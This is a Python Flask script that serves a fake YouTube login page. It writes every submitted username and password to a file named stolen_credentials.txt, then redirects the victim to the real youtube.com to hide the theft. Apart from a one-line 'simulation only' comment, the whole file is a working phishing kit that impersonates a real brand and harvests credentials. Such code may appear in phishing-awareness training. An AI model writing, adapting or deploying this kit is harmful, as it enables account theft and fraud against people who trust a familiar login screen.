from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 350px;
        }
        .form-control {
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>YOUTUBE LOGIN </h2>
    <form method="POST">
        <input type="text" class="form-control" name="username" placeholder="Username" required>
        <input type="password" class="form-control" name="password" placeholder="Password" required>
        <button type="submit" class="btn btn-primary w-100">Login</button>
    </form>
</div>

</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def fake_login():
    if request.method == "POST":
        # For simulation only — DO NOT store credentials in real environments
        username = request.form["username"]
        password = request.form["password"]

        with open("stolen_credentials.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")

        # Redirect directly to real website
        return redirect("https://youtube.com")  # Replace with any legitimate link

    return render_template_string(login_page)

if __name__ == "__main__":
    app.run(debug=True)
